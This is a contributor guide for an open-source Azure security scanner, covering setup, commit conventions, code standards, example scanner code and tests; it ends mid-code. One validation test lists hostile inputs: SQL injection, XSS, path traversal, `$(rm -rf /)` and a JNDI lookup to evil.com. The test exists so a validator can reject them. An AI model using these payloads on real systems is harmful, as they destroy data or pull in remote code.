# 📋 Contributing Guide - Security Copilot Agent

## Welcome Contributors! 🎉

Thank you for your interest in contributing to the Security Copilot Agent! This guide will help you get started with contributing to our open-source security automation platform.

## Table of Contents

- [Code of Conduct](#code-of-conduct)
- [Getting Started](#getting-started)
- [Development Environment](#development-environment)
- [Contribution Types](#contribution-types)
- [Development Workflow](#development-workflow)
- [Code Standards](#code-standards)
- [Testing Guidelines](#testing-guidelines)
- [Security Guidelines](#security-guidelines)
- [Documentation](#documentation)
- [Community](#community)

## Code of Conduct

### Our Pledge

We are committed to making participation in our project a harassment-free experience for everyone, regardless of age, body size, disability, ethnicity, gender identity and expression, level of experience, nationality, personal appearance, race, religion, or sexual identity and orientation.

### Our Standards

**Positive behaviors include:**
- Using welcoming and inclusive language
- Being respectful of differing viewpoints and experiences
- Gracefully accepting constructive criticism
- Focusing on what is best for the community
- Showing empathy towards other community members

**Unacceptable behaviors include:**
- The use of sexualized language or imagery
- Trolling, insulting/derogatory comments, and personal attacks
- Public or private harassment
- Publishing others' private information without explicit permission
- Other conduct which could reasonably be considered inappropriate in a professional setting

### Enforcement

Instances of abusive, harassing, or otherwise unacceptable behavior may be reported by contacting the project team at conduct@security-copilot.com. All complaints will be reviewed and investigated promptly and fairly.

## Getting Started

### Prerequisites

Before you begin, ensure you have the following installed:
- **Python 3.9+** with pip and virtual environment support
- **Git** 2.30+ for version control
- **Docker** 20.10+ for containerization
- **Azure CLI** 2.50+ for Azure integration
- **Node.js 16+** for documentation tools (optional)

### Initial Setup

1. **Fork the Repository**
   ```bash
   # Navigate to https://github.com/kineticKshitij/Security-copilot-agent
   # Click "Fork" to create your own copy
   ```

2. **Clone Your Fork**
   ```bash
   git clone https://github.com/YOUR_USERNAME/Security-copilot-agent.git
   cd Security-copilot-agent
   ```

3. **Add Upstream Remote**
   ```bash
   git remote add upstream https://github.com/kineticKshitij/Security-copilot-agent.git
   ```

4. **Verify Remotes**
   ```bash
   git remote -v
   # origin    https://github.com/YOUR_USERNAME/Security-copilot-agent.git (fetch)
   # origin    https://github.com/YOUR_USERNAME/Security-copilot-agent.git (push)
   # upstream  https://github.com/kineticKshitij/Security-copilot-agent.git (fetch)
   # upstream  https://github.com/kineticKshitij/Security-copilot-agent.git (push)
   ```

## Development Environment

### Python Environment Setup

1. **Create Virtual Environment**
   ```bash
   python -m venv .venv
   
   # Activate virtual environment
   # Windows:
   .venv\Scripts\activate
   # Linux/Mac:
   source .venv/bin/activate
   ```

2. **Install Dependencies**
   ```bash
   # Install production dependencies
   pip install -r requirements.txt
   
   # Install development dependencies
   pip install -r requirements-dev.txt
   ```

3. **Install Pre-commit Hooks**
   ```bash
   pre-commit install
   ```

### Development Tools Configuration

#### VS Code Setup (Recommended)
```json
// .vscode/settings.json
{
    "python.defaultInterpreterPath": "./.venv/bin/python",
    "python.formatting.provider": "black",
    "python.linting.enabled": true,
    "python.linting.flake8Enabled": true,
    "python.linting.mypyEnabled": true,
    "python.testing.pytestEnabled": true,
    "python.testing.pytestArgs": [
        "tests/",
        "-v",
        "--cov=security_copilot",
        "--cov-report=html"
    ],
    "editor.formatOnSave": true,
    "editor.codeActionsOnSave": {
        "source.organizeImports": true
    }
}
```

#### PyCharm Setup
```yaml
# Configure PyCharm:
# 1. File > Settings > Project > Python Interpreter
#    - Add interpreter from .venv/bin/python
# 2. File > Settings > Tools > External Tools
#    - Add Black formatter
#    - Add Flake8 linter
#    - Add MyPy type checker
# 3. File > Settings > Editor > Code Style > Python
#    - Set line length to 88 (Black standard)
```

### Environment Variables

Create a `.env.dev` file for development:
```env
# Development Environment Configuration
LOG_LEVEL=DEBUG
SCAN_INTERVAL_MINUTES=5
ENABLE_AUTO_REMEDIATION=false
DRY_RUN_MODE=true

# Azure Configuration (Use test subscription)
AZURE_SUBSCRIPTION_ID=your-test-subscription-id
AZURE_CLIENT_ID=your-dev-client-id
AZURE_CLIENT_SECRET=your-dev-client-secret
AZURE_TENANT_ID=your-tenant-id

# GitHub Configuration (Use test repository)
GITHUB_TOKEN=your-dev-github-token
GITHUB_REPO_OWNER=your-username
GITHUB_REPO_NAME=security-copilot-agent-dev

# Database Configuration (Use local SQLite for development)
USE_LOCAL_DATABASE=true
DATABASE_URL=sqlite:///dev_security_copilot.db
```

## Contribution Types

### 🐛 Bug Reports

**Before submitting a bug report:**
- Check the [existing issues](https://github.com/kineticKshitij/Security-copilot-agent/issues)
- Update to the latest version and test again
- Collect relevant logs and error messages

**Bug report should include:**
- Clear, descriptive title
- Steps to reproduce the issue
- Expected vs. actual behavior
- Environment details (OS, Python version, etc.)
- Relevant logs or error messages
- Screenshots (if applicable)

**Bug Report Template:**
```markdown
## Bug Description
A clear and concise description of the bug.

## Steps to Reproduce
1. Go to '...'
2. Click on '....'
3. Scroll down to '....'
4. See error

## Expected Behavior
A clear description of what you expected to happen.

## Actual Behavior
A clear description of what actually happened.

## Environment
- OS: [e.g., Windows 10, Ubuntu 20.04]
- Python Version: [e.g., 3.11.5]
- Security Copilot Version: [e.g., 1.2.3]
- Azure CLI Version: [e.g., 2.50.0]

## Additional Context
Any other context about the problem here.
```

### ✨ Feature Requests

**Before submitting a feature request:**
- Check if the feature already exists
- Search existing feature requests
- Consider if this fits the project's goals

**Feature request should include:**
- Clear, descriptive title
- Detailed description of the proposed feature
- Use cases and benefits
- Possible implementation approach
- Alternative solutions considered

**Feature Request Template:**
```markdown
## Feature Description
A clear and concise description of the feature you'd like to see.

## Problem Statement
What problem does this feature solve? What need does it address?

## Proposed Solution
Describe the solution you'd like to see implemented.

## Use Cases
Provide specific examples of how this feature would be used.

## Benefits
- Who would benefit from this feature?
- How does it improve the project?
- What value does it add?

## Implementation Ideas
Any thoughts on how this could be implemented?

## Alternatives Considered
Describe alternative solutions or features you've considered.

## Additional Context
Any other context, screenshots, or examples about the feature request.
```

### 🔧 Code Contributions

#### Security Rules
Add new security detection rules:
- Network security misconfigurations
- Access control violations
- Encryption weaknesses
- Compliance violations

#### Platform Integrations
Extend platform support:
- AWS security scanning
- Google Cloud Platform integration
- Multi-cloud environments
- Third-party security tools

#### Performance Improvements
Optimize existing functionality:
- Faster scanning algorithms
- Better resource utilization
- Improved error handling
- Enhanced monitoring

#### Documentation Improvements
Help improve our documentation:
- API documentation
- Setup guides
- Troubleshooting guides
- Code examples

## Development Workflow

### Feature Development Process

1. **Create Feature Branch**
   ```bash
   # Sync with upstream
   git fetch upstream
   git checkout main
   git merge upstream/main
   
   # Create feature branch
   git checkout -b feature/amazing-security-feature
   ```

2. **Develop Your Feature**
   ```bash
   # Make your changes
   # Add tests
   # Update documentation
   
   # Run tests locally
   pytest tests/ --cov=security_copilot
   ```

3. **Commit Your Changes**
   ```bash
   # Stage your changes
   git add .
   
   # Commit with descriptive message
   git commit -m "feat: add advanced threat detection for NSG rules
   
   - Implement ML-based anomaly detection
   - Add support for custom threat patterns
   - Include comprehensive test coverage
   - Update documentation with examples
   
   Fixes #123"
   ```

4. **Push and Create Pull Request**
   ```bash
   # Push to your fork
   git push origin feature/amazing-security-feature
   
   # Create pull request on GitHub
   ```

### Commit Message Guidelines

We follow the [Conventional Commits](https://www.conventionalcommits.org/) specification:

```
<type>[optional scope]: <description>

[optional body]

[optional footer(s)]
```

**Types:**
- `feat`: New feature
- `fix`: Bug fix
- `docs`: Documentation changes
- `style`: Code style changes (formatting, etc.)
- `refactor`: Code refactoring
- `perf`: Performance improvements
- `test`: Adding or updating tests
- `chore`: Maintenance tasks
- `ci`: CI/CD changes
- `build`: Build system changes

**Examples:**
```bash
feat(scanner): add support for Azure Application Gateway scanning

fix(database): resolve connection timeout issues in high-load scenarios

docs(api): update authentication examples with new token format

test(integration): add comprehensive Azure NSG scanning tests

refactor(core): improve error handling in security rule engine
```

### Pull Request Process

#### Before Submitting

1. **Code Quality Checks**
   ```bash
   # Format code
   black security_copilot/ tests/
   
   # Sort imports
   isort security_copilot/ tests/
   
   # Lint code
   flake8 security_copilot/ tests/
   
   # Type checking
   mypy security_copilot/
   
   # Run tests
   pytest tests/ --cov=security_copilot --cov-report=html
   
   # Security scanning
   bandit -r security_copilot/
   ```

2. **Documentation Updates**
   ```bash
   # Update API documentation if needed
   # Update README if adding new features
   # Add or update docstrings
   # Update configuration examples
   ```

3. **Test Coverage**
   ```bash
   # Ensure >90% test coverage for new code
   # Add integration tests for new features
   # Update existing tests if needed
   # Test in different environments
   ```

#### Pull Request Template

```markdown
## Description
Brief description of the changes made.

## Type of Change
- [ ] Bug fix (non-breaking change which fixes an issue)
- [ ] New feature (non-breaking change which adds functionality)
- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)
- [ ] Documentation update
- [ ] Performance improvement
- [ ] Code refactoring

## Related Issues
Fixes #(issue number)
Related to #(issue number)

## Changes Made
- [ ] Added new security rule for X
- [ ] Updated Y component to handle Z
- [ ] Improved error handling in W
- [ ] Added tests for new functionality

## Testing
- [ ] Unit tests pass
- [ ] Integration tests pass
- [ ] Manual testing completed
- [ ] Test coverage >90%

## Security Considerations
- [ ] No sensitive data in logs
- [ ] Input validation implemented
- [ ] Authentication/authorization preserved
- [ ] No new security vulnerabilities introduced

## Documentation
- [ ] Code is self-documenting
- [ ] Docstrings added/updated
- [ ] README updated (if needed)
- [ ] API documentation updated (if needed)

## Checklist
- [ ] My code follows the project's style guidelines
- [ ] I have performed a self-review of my code
- [ ] I have commented my code, particularly in hard-to-understand areas
- [ ] I have made corresponding changes to the documentation
- [ ] My changes generate no new warnings
- [ ] I have added tests that prove my fix is effective or that my feature works
- [ ] New and existing unit tests pass locally with my changes
```

## Code Standards

### Python Style Guide

We follow [PEP 8](https://pep8.org/) with some modifications:

#### Code Formatting
```python
# Use Black formatter with 88-character line length
# Example:
from typing import Dict, List, Optional, Union
from datetime import datetime, timedelta

import asyncio
import logging
from dataclasses import dataclass

from azure.identity import DefaultAzureCredential
from azure.mgmt.network import NetworkManagementClient

from security_copilot.models import SecurityFinding, FindingSeverity


@dataclass
class ScanConfig:
    """Configuration for security scanning operations."""
    
    subscription_id: str
    resource_groups: Optional[List[str]] = None
    severity_filter: List[FindingSeverity] = None
    auto_remediate: bool = False
    dry_run: bool = False
    
    def __post_init__(self):
        """Validate configuration after initialization."""
        if self.severity_filter is None:
            self.severity_filter = [FindingSeverity.HIGH, FindingSeverity.CRITICAL]


class SecurityScanner:
    """Main security scanner for Azure resources."""
    
    def __init__(self, config: ScanConfig, credential: DefaultAzureCredential):
        """Initialize scanner with configuration and credentials.
        
        Args:
            config: Scanning configuration
            credential: Azure credentials for authentication
            
        Raises:
            ValueError: If configuration is invalid
            AuthenticationError: If credentials are invalid
        """
        self.config = config
        self.credential = credential
        self.network_client = NetworkManagementClient(
            credential, config.subscription_id
        )
        self.logger = logging.getLogger(__name__)
    
    async def scan_network_security_groups(self) -> List[SecurityFinding]:
        """Scan all NSGs for security misconfigurations.
        
        Returns:
            List of security findings discovered during scan
            
        Raises:
            ScanError: If scanning fails due to authentication or API errors
        """
        findings = []
        
        try:
            # Get all resource groups or use specified ones
            resource_groups = (
                self.config.resource_groups 
                or await self._get_all_resource_groups()
            )
            
            for rg_name in resource_groups:
                rg_findings = await self._scan_resource_group_nsgs(rg_name)
                findings.extend(rg_findings)
                
                self.logger.info(
                    "Scanned NSGs in resource group",
                    extra={
                        "resource_group": rg_name,
                        "findings_count": len(rg_findings)
                    }
                )
            
            return self._filter_findings_by_severity(findings)
            
        except Exception as e:
            self.logger.error(
                "Failed to scan network security groups",
                extra={"error": str(e)}
            )
            raise ScanError(f"Scanning failed: {e}") from e
```

#### Type Hints
```python
# Always use type hints for function parameters and return values
from typing import Dict, List, Optional, Union, Any, Callable, Awaitable

# Function signatures
async def process_findings(
    findings: List[SecurityFinding],
    filters: Optional[Dict[str, Any]] = None,
    callback: Optional[Callable[[SecurityFinding], Awaitable[None]]] = None
) -> Dict[str, int]:
    """Process security findings with optional filtering and callback."""
    pass

# Class attributes
class SecurityRule:
    name: str
    severity: FindingSeverity
    conditions: List[RuleCondition]
    enabled: bool = True
    
    def __init__(self, name: str, severity: FindingSeverity):
        self.name = name
        self.severity = severity
        self.conditions = []
```

#### Error Handling
```python
# Custom exception hierarchy
class SecurityCopilotError(Exception):
    """Base exception for Security Copilot Agent."""
    pass

class AuthenticationError(SecurityCopilotError):
    """Raised when authentication fails."""
    pass

class ScanError(SecurityCopilotError):
    """Raised when scanning operations fail."""
    pass

class ConfigurationError(SecurityCopilotError):
    """Raised when configuration is invalid."""
    pass

# Error handling example
async def scan_with_retry(self, max_retries: int = 3) -> List[SecurityFinding]:
    """Scan with automatic retry on transient failures."""
    last_exception = None
    
    for attempt in range(max_retries):
        try:
            return await self.scan_network_security_groups()
        except AuthenticationError:
            # Don't retry authentication errors
            raise
        except ScanError as e:
            last_exception = e
            if attempt < max_retries - 1:
                wait_time = 2 ** attempt  # Exponential backoff
                self.logger.warning(
                    "Scan attempt failed, retrying",
                    extra={
                        "attempt": attempt + 1,
                        "max_retries": max_retries,
                        "wait_time": wait_time,
                        "error": str(e)
                    }
                )
                await asyncio.sleep(wait_time)
            else:
                self.logger.error(
                    "All scan attempts failed",
                    extra={"max_retries": max_retries, "error": str(e)}
                )
    
    raise last_exception
```

#### Logging Standards
```python
import logging
import structlog

# Configure structured logging
structlog.configure(
    processors=[
        structlog.stdlib.filter_by_level,
        structlog.stdlib.add_logger_name,
        structlog.stdlib.add_log_level,
        structlog.stdlib.PositionalArgumentsFormatter(),
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.StackInfoRenderer(),
        structlog.processors.format_exc_info,
        structlog.processors.UnicodeDecoder(),
        structlog.processors.JSONRenderer()
    ],
    context_class=dict,
    logger_factory=structlog.stdlib.LoggerFactory(),
    wrapper_class=structlog.stdlib.BoundLogger,
    cache_logger_on_first_use=True,
)

# Usage example
class SecurityScanner:
    def __init__(self):
        self.logger = structlog.get_logger(__name__)
    
    async def scan_resource(self, resource_id: str):
        """Scan a specific Azure resource."""
        self.logger.info(
            "Starting resource scan",
            resource_id=resource_id,
            scan_type="nsg_rules"
        )
        
        try:
            findings = await self._perform_scan(resource_id)
            
            self.logger.info(
                "Resource scan completed",
                resource_id=resource_id,
                findings_count=len(findings),
                critical_findings=len([f for f in findings if f.severity == "critical"])
            )
            
            return findings
            
        except Exception as e:
            self.logger.error(
                "Resource scan failed",
                resource_id=resource_id,
                error=str(e),
                error_type=type(e).__name__
            )
            raise
```

## Testing Guidelines

### Test Structure

```
tests/
├── unit/                    # Unit tests
│   ├── test_scanner.py
│   ├── test_models.py
│   ├── test_rules.py
│   └── test_database.py
├── integration/             # Integration tests
│   ├── test_azure_integration.py
│   ├── test_github_integration.py
│   └── test_database_integration.py
├── e2e/                     # End-to-end tests
│   ├── test_full_scan_workflow.py
│   └── test_remediation_workflow.py
├── fixtures/                # Test data and fixtures
│   ├── azure_responses.json
│   ├── sample_nsgs.json
│   └── mock_findings.json
└── conftest.py             # Pytest configuration and fixtures
```

### Unit Testing Examples

```python
# tests/unit/test_scanner.py
import pytest
from unittest.mock import AsyncMock, Mock, patch
from datetime import datetime

from security_copilot.scanner import SecurityScanner
from security_copilot.models import ScanConfig, SecurityFinding, FindingSeverity
from security_copilot.exceptions import ScanError, AuthenticationError


class TestSecurityScanner:
    """Test suite for SecurityScanner class."""
    
    @pytest.fixture
    def mock_credential(self):
        """Mock Azure credential for testing."""
        return Mock()
    
    @pytest.fixture
    def scan_config(self):
        """Standard scan configuration for testing."""
        return ScanConfig(
            subscription_id="test-subscription-id",
            resource_groups=["test-rg"],
            auto_remediate=False,
            dry_run=True
        )
    
    @pytest.fixture
    def scanner(self, scan_config, mock_credential):
        """SecurityScanner instance for testing."""
        return SecurityScanner(scan_config, mock_credential)
    
    @pytest.mark.asyncio
    async def test_scan_network_security_groups_success(self, scanner):
        """Test successful NSG scanning."""
        # Arrange
        expected_findings = [
            SecurityFinding(
                id="test-finding-1",
                title="Test Finding",
                severity=FindingSeverity.HIGH,
                resource_name="test-nsg",
                resource_group="test-rg",
                detected_at=datetime.utcnow()
            )
        ]
        
        with patch.object(scanner, '_get_all_resource_groups') as mock_get_rgs, \
             patch.object(scanner, '_scan_resource_group_nsgs') as mock_scan_rg:
            
            mock_get_rgs.return_value = ["test-rg"]
            mock_scan_rg.return_value = expected_findings
            
            # Act
            result = await scanner.scan_network_security_groups()
            
            # Assert
            assert len(result) == 1
            assert result[0].id == "test-finding-1"
            assert result[0].severity == FindingSeverity.HIGH
            mock_scan_rg.assert_called_once_with("test-rg")
    
    @pytest.mark.asyncio
    async def test_scan_network_security_groups_authentication_error(self, scanner):
        """Test handling of authentication errors during scanning."""
        # Arrange
        with patch.object(scanner, '_get_all_resource_groups') as mock_get_rgs:
            mock_get_rgs.side_effect = AuthenticationError("Invalid credentials")
            
            # Act & Assert
            with pytest.raises(ScanError) as exc_info:
                await scanner.scan_network_security_groups()
            
            assert "Scanning failed" in str(exc_info.value)
    
    @pytest.mark.asyncio
    async def test_filter_findings_by_severity(self, scanner):
        """Test filtering findings by severity level."""
        # Arrange
        findings = [
            SecurityFinding(
                id="critical-finding",
                severity=FindingSeverity.CRITICAL,
                title="Critical Issue",
                resource_name="test",
                resource_group="test",
                detected_at=datetime.utcnow()
            ),
            SecurityFinding(
                id="low-finding",
                severity=FindingSeverity.LOW,
                title="Low Issue",
                resource_name="test",
                resource_group="test",
                detected_at=datetime.utcnow()
            )
        ]
        
        # Act
        filtered = scanner._filter_findings_by_severity(findings)
        
        # Assert - should only include HIGH and CRITICAL by default
        assert len(filtered) == 1
        assert filtered[0].severity == FindingSeverity.CRITICAL


# tests/integration/test_azure_integration.py
@pytest.mark.integration
@pytest.mark.asyncio
class TestAzureIntegration:
    """Integration tests for Azure API interactions."""
    
    @pytest.fixture
    def azure_credentials(self):
        """Real Azure credentials for integration testing."""
        # Only run if credentials are available
        pytest.importorskip("azure.identity")
        return DefaultAzureCredential()
    
    @pytest.mark.skipif(
        not os.getenv("AZURE_SUBSCRIPTION_ID"),
        reason="Azure credentials not available"
    )
    async def test_real_azure_nsg_scan(self, azure_credentials):
        """Test scanning real Azure NSGs (requires valid credentials)."""
        config = ScanConfig(
            subscription_id=os.getenv("AZURE_SUBSCRIPTION_ID"),
            dry_run=True  # Ensure no modifications
        )
        
        scanner = SecurityScanner(config, azure_credentials)
        
        # This should connect to real Azure and scan NSGs
        findings = await scanner.scan_network_security_groups()
        
        # Verify we got some results (even if no findings)
        assert isinstance(findings, list)
        
        # If findings exist, verify they have required fields
        for finding in findings:
            assert finding.id
            assert finding.title
            assert finding.severity in FindingSeverity
            assert finding.resource_name
            assert finding.detected_at
```

### Test Configuration

```python
# conftest.py
import pytest
import asyncio
import os
from unittest.mock import Mock

# Configure pytest-asyncio
pytest_plugins = ("pytest_asyncio",)


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def mock_azure_client():
    """Mock Azure client for testing."""
    client = Mock()
    client.network_security_groups.list.return_value = []
    client.network_security_groups.get.return_value = Mock()
    return client


@pytest.fixture
def sample_nsg_rules():
    """Sample NSG rules for testing."""
    return [
        {
            "name": "AllowSSH",
            "protocol": "Tcp",
            "source_port_range": "*",
            "destination_port_range": "22",
            "source_address_prefix": "0.0.0.0/0",
            "destination_address_prefix": "*",
            "access": "Allow",
            "priority": 1000,
            "direction": "Inbound"
        },
        {
            "name": "DenyAll",
            "protocol": "*",
            "source_port_range": "*",
            "destination_port_range": "*",
            "source_address_prefix": "*",
            "destination_address_prefix": "*",
            "access": "Deny",
            "priority": 4096,
            "direction": "Inbound"
        }
    ]


# Pytest configuration
def pytest_configure(config):
    """Configure pytest with custom markers."""
    config.addinivalue_line(
        "markers", "integration: mark test as integration test"
    )
    config.addinivalue_line(
        "markers", "slow: mark test as slow running"
    )
    config.addinivalue_line(
        "markers", "azure: mark test as requiring Azure credentials"
    )
```

### Test Coverage Requirements

```bash
# Minimum coverage requirements
pytest tests/ \
    --cov=security_copilot \
    --cov-report=html \
    --cov-report=term \
    --cov-fail-under=90

# Coverage configuration in setup.cfg
[coverage:run]
source = security_copilot
omit = 
    */tests/*
    */venv/*
    */migrations/*
    */settings/*

[coverage:report]
exclude_lines =
    pragma: no cover
    def __repr__
    raise AssertionError
    raise NotImplementedError
    if __name__ == .__main__.:
```

## Security Guidelines

### Secure Coding Practices

#### Input Validation
```python
from pydantic import BaseModel, validator
import re

class ResourceIdentifier(BaseModel):
    """Validated Azure resource identifier."""
    
    subscription_id: str
    resource_group: str
    resource_name: str
    
    @validator('subscription_id')
    def validate_subscription_id(cls, v):
        """Validate Azure subscription ID format."""
        if not re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', v):
            raise ValueError('Invalid subscription ID format')
        return v
    
    @validator('resource_group')
    def validate_resource_group(cls, v):
        """Validate resource group name."""
        if not re.match(r'^[a-zA-Z0-9._-]+$', v):
            raise ValueError('Invalid resource group name')
        if len(v) > 90:
            raise ValueError('Resource group name too long')
        return v
    
    @validator('resource_name')
    def validate_resource_name(cls, v):
        """Validate resource name."""
        # Sanitize and validate resource names
        sanitized = re.sub(r'[^a-zA-Z0-9._-]', '', v)
        if not sanitized:
            raise ValueError('Invalid resource name')
        return sanitized[:80]  # Limit length
```

#### Secrets Management
```python
import os
from azure.keyvault.secrets import SecretClient
from azure.identity import DefaultAzureCredential

class SecureConfig:
    """Secure configuration management."""
    
    def __init__(self):
        self.keyvault_url = os.getenv("AZURE_KEYVAULT_URL")
        if self.keyvault_url:
            credential = DefaultAzureCredential()
            self.secret_client = SecretClient(
                vault_url=self.keyvault_url,
                credential=credential
            )
        else:
            self.secret_client = None
    
    def get_secret(self, secret_name: str) -> str:
        """Retrieve secret from Key Vault or environment."""
        # Try Key Vault first
        if self.secret_client:
            try:
                secret = self.secret_client.get_secret(secret_name)
                return secret.value
            except Exception:
                pass  # Fall back to environment variable
        
        # Fall back to environment variable
        value = os.getenv(secret_name)
        if not value:
            raise ValueError(f"Secret '{secret_name}' not found")
        
        return value
    
    def get_database_connection_string(self) -> str:
        """Build database connection string securely."""
        server = self.get_secret("AZURE_SQL_SERVER")
        database = self.get_secret("AZURE_SQL_DATABASE")
        username = self.get_secret("AZURE_SQL_USERNAME")
        password = self.get_secret("AZURE_SQL_PASSWORD")
        
        # Build connection string without logging password
        connection_string = (
            f"mssql+pymssql://{username}:{password}@{server}/{database}"
            f"?driver=ODBC+Driver+18+for+SQL+Server"
        )
        
        return connection_string
```

#### Logging Security
```python
import logging
import json
from typing import Any, Dict

class SecureFormatter(logging.Formatter):
    """Secure log formatter that redacts sensitive information."""
    
    SENSITIVE_FIELDS = {
        'password', 'secret', 'token', 'key', 'credential',
        'authorization', 'cookie', 'session'
    }
    
    def format(self, record: logging.LogRecord) -> str:
        """Format log record with sensitive data redaction."""
        # Create a copy of the record to avoid modifying the original
        record_dict = record.__dict__.copy()
        
        # Redact sensitive information
        if hasattr(record, 'extra_fields'):
            record_dict['extra_fields'] = self._redact_sensitive_data(
                record.extra_fields
            )
        
        # Redact message content
        if hasattr(record, 'msg'):
            record_dict['msg'] = self._redact_message(record.msg)
        
        # Create new record with redacted data
        redacted_record = logging.LogRecord(**record_dict)
        
        return super().format(redacted_record)
    
    def _redact_sensitive_data(self, data: Any) -> Any:
        """Recursively redact sensitive data from objects."""
        if isinstance(data, dict):
            return {
                key: (
                    "[REDACTED]" 
                    if any(sensitive in key.lower() for sensitive in self.SENSITIVE_FIELDS)
                    else self._redact_sensitive_data(value)
                )
                for key, value in data.items()
            }
        elif isinstance(data, list):
            return [self._redact_sensitive_data(item) for item in data]
        elif isinstance(data, str):
            # Redact common patterns
            return self._redact_patterns(data)
        else:
            return data
    
    def _redact_patterns(self, text: str) -> str:
        """Redact common sensitive patterns in text."""
        import re
        
        # Azure subscription IDs
        text = re.sub(
            r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b',
            '[REDACTED-SUBSCRIPTION-ID]',
            text
        )
        
        # GitHub tokens
        text = re.sub(
            r'\bghp_[a-zA-Z0-9]{36}\b',
            '[REDACTED-GITHUB-TOKEN]',
            text
        )
        
        # Generic secrets (base64-like strings)
        text = re.sub(
            r'\b[A-Za-z0-9+/]{40,}={0,2}\b',
            '[REDACTED-SECRET]',
            text
        )
        
        return text
```

### Security Testing

```python
# tests/security/test_input_validation.py
import pytest
from security_copilot.models import ResourceIdentifier
from pydantic import ValidationError

class TestInputValidation:
    """Security tests for input validation."""
    
    def test_subscription_id_injection_protection(self):
        """Test protection against injection in subscription ID."""
        malicious_inputs = [
            "'; DROP TABLE findings; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "$(rm -rf /)",
            "${jndi:ldap://evil.com/}"
        ]
        
        for malicious_input in malicious_inputs:
            with pytest.raises(ValidationError):
                ResourceIdentifier(
                    subscription_id=malicious_input,
                    resource_group="test",
                    resource_name="test"
                )
    
    def test_resource_name_sanitization(self):
        """Test resource name sanitization."""
        test_cases = [
            ("normal_name", "normal_name"),
            ("name with spaces", "namewithspaces"),
            ("name/with/slashes", "namewithslashes"),
            ("name<with>html", "namewithhtml"),
            ("very_long_name_" * 10, "very_long_name_" * 5)  # Truncated
        ]
        
        for input_name, expected in test_cases:
            resource = ResourceIdentifier(
                subscription_id="12345678-1234-1234-1234-123456789012",
                resource_group="test",
                resource_name=input_name
            )
            assert len(resource.resource_name) <= 80
            # Additional assertions based on expected behavior
```

## Documentation

### Docstring Standards

```python
def analyze_security_rule(
    rule: Dict[str, Any],
    severity_threshold: FindingSeverity = FindingSeverity.MEDIUM
) -> Optional[SecurityFinding]:
    """Analyze a security rule for potential misconfigurations.
    
    Evaluates an Azure Network Security Group rule against security best
    practices and returns a finding if any issues are detected.
    
    Args:
        rule: Dictionary containing NSG rule configuration with keys:
            - name: Rule name (str)
            - protocol: Network protocol (str, e.g., 'Tcp', 'Udp', '*')
            - source_port_range: Source port range (str)
            - destination_port_range: Destination port range (str)
            - source_address_prefix: Source address prefix (str)
            - destination_address_prefix: Destination address prefix (str)
            - access: Access type (str, 'Allow' or 'Deny')
            - priority: Rule priority (int, 100-4096)
            - direction: Traffic direction (str, 'Inbound' or 'Outbound')
        severity_threshold: Minimum severity level for findings to be returned.
            Only findings with severity >= threshold will be returned.
    
    Returns:
        SecurityFinding object if a misconfiguration is detected and meets
        the severity threshold, None otherwise.
        
        The SecurityFinding includes:
        - id: Unique finding identifier
        - title: Human-readable issue description
        - severity: Issue severity level
        - description: Detailed explanation of the issue
        - remediation_steps: List of recommended fixes
        - cvss_score: Common Vulnerability Scoring System score (if applicable)
    
    Raises:
        ValueError: If the rule dictionary is missing required keys or
            contains invalid values.
        TypeError: If rule is not a dictionary or severity_threshold
            is not a FindingSeverity enum value.
    
    Examples:
        >>> rule = {
        ...     "name": "AllowSSH",
        ...     "protocol": "Tcp",
        ...     "source_port_range": "*",
        ...     "destination_port_range": "22",
        ...     "source_address_prefix": "0.0.0.0/0",
        ...     "destination_address_prefix": "*",
        ...     "access": "Allow",
        ...     "priority": 1000,
        ...     "direction": "Inbound"
        ... }
        >>> finding = analyze_security_rule(rule)
        >>> if finding:
        ...     print(f"Found {finding.severity} issue: {finding.title}")
        Found CRITICAL issue: Unrestricted SSH access from internet
        
        >>> # Rule that allows only internal access
        >>> safe_rule = rule.copy()
        >>> safe_rule["source_address_prefix"] = "10.0.0.0/8"
        >>> finding = analyze_security_rule(safe_rule)
        >>> print(finding)  # Should be None for safe configuration
        None
    
    Note:
        This function performs static analysis only and cannot detect
        runtime security issues or complex policy interactions. It should
        be used as part of a comprehensive security assessment strategy.
        
        The analysis covers common misconfigurations including:
        - Unrestricted access from the internet (0.0.0.0/0)
        - High-risk ports exposed externally
        - Overly permissive protocols
        - Management ports accessible from untrusted networks
    
    See Also:
        - SecurityFinding: Data model for security findings
        - FindingSeverity: Enumeration of severity levels
        - scan_network_security_groups: Function that uses this analyzer
    """
    # Implementation here...
    pass
```

### README Updates

When adding new features, update the README with:

1. **Feature description** in the main features list
2. **Installation requirements** if new dependencies are added
3. **Configuration examples** for new settings
4. **Usage examples** showing the new functionality
5. **API documentation** links if applicable

### Code Examples

Provide comprehensive examples for new features:

```python
# examples/custom_security_rules.py
"""
Example: Creating custom security rules for Security Copilot Agent

This example demonstrates how to create and register custom security
rules to detect organization-specific misconfigurations.
"""

from security_copilot.rules import SecurityRule, RuleCondition
from security_copilot.models import FindingSeverity, ResourceType
from typing import Dict, Any, List


class DatabaseExposureRule(SecurityRule):
    """Custom rule to detect database ports exposed to the internet."""
    
    def __init__(self):
        super().__init__(
            name="database_internet_exposure",
            severity=FindingSeverity.HIGH,
            description="Detects database ports exposed to internet",
            cvss_score=7.5
        )
        
        # Define database ports to check
        self.database_ports = [
            1433,  # SQL Server
            3306,  # MySQL
            5432,  # PostgreSQL
            1521,  # Oracle
            27017, # MongoDB
            6379,  # Redis
            9200,  # Elasticsearch
        ]
    
    def evaluate(self, resource: Dict[str, Any]) -> bool:
        """
        Evaluate if the resource has database ports exposed to internet.
        
        Args:
            resource: Azure NSG rule resource dictionary
            
        Returns:
            True if misconfiguration is detected, False otherwise
        """
        if resource.get("type") != ResourceType.NSG_RULE:
            return False
        
        # Check if rule allows access
        if resource.get("access", "").lower() != "allow":
            return False
        
        # Check if source is internet
        source_prefix = resource.get("source_address_prefix", "")
        if source_prefix not in ["0.0.0.0/0", "*", "Internet"]:
            return False
        
        # Check if destination port is a database port
        dest_port = self._parse_port_range(
